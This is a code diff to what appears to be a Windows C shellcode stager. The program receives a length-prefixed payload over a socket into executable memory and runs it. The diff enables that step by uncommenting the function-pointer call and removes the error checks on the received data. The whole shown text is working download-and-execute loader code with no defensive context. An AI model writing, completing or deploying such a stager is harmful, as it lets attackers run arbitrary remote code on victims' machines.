@@ -41,27 +41,19 @@ int main() {
   char *rwx = (char *)VirtualAlloc(NULL, PAYLOAD_SZ, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
   char *index = rwx;
   int res = 0;
-  int size = 0;
+  u_long size = 0;
   int rcvd = 0;
 
   printf("Receiving\n");
   do {
     res = recv( ConnectSocket, index, BUF_LEN, 0 );
-    if (res > 0) {
-      if (rcvd == 0) { size = ntohl(*index); printf("Size: %d\n", size); }
-      index += res;
-      rcvd += res;
-    }
-//    else if (res == 0) {
-//      break;
-//    }
-//    else {
-//      break;
-//    }
+    if (rcvd == 0) { size = *(u_long*)rwx; }
+    index += res;
+    rcvd += res;
   } while (size > rcvd);
 
-  //printf("Executing payload.\n");
+  printf("Executing payload.\n");
   // Execute the received payload
-  //(*(void(*)()) (rwx + 4))();
+  (*(void(*)()) (rwx + 4))();
 }
 
